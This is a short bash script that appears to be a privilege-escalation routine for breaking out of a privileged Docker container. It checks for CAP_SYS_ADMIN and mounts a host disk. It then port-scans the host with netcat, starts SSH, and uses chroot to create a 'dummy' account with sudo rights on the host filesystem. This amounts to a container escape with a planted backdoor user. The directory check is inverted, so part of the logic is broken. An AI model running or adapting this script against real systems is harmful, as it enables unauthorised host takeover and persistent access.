apt update && apt install -y netcat \
			     net-tools \
			     openssh-server \
			     libcap2

capsh --print  # Check capabilities CAP_SYS_ADMIN
fdisk -l  # Check for disk

echo "Type the device: "
read device
echo "Type the destination: "
read dest

if [[ -d ${dest} ]]; then
	mkdir -p ${dest}
fi;

mount ${device} ${dest}  # mount the device on the target
ifconfig  # get IP address
echo "Type the IP address of the host: (usually 172.17.0.1)"
read ip

nc -vn -w2 -z ${ip} 1-65535 2>&1 | grep succeeded  # Checks for opern ports
service ssh start  # Start the SSH service
chroot ${dest} adduser dummy  # Create a new dummy user
chroot ${dest} usermod -aG sudo dummy  # Gives dummy sudo privileges
sudo -s
ps -eaf  # See the entire list of process of the host machine
